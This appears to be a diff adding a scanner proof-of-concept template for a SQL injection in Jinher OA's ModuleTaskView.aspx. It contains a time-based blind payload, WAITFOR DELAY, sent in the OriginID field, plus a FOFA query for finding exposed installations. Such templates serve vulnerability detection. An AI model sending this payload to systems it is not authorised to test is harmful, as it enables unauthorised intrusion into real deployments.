@@ -1,0 +1,31 @@
+id: poc-yaml-jinher-moduletaskview-aspx-sqli
+info:
+  name: 金和OA ModuleTaskView.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx/
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: OriginModule=crmexec&OriginID=1'WAITFOR+DELAY'0:0:5'--
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"任务查看") &&
+
+    contains(gbk_decode(body),"布置任务") &&
+
+    contains(gbk_decode(body),"汇报情况") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
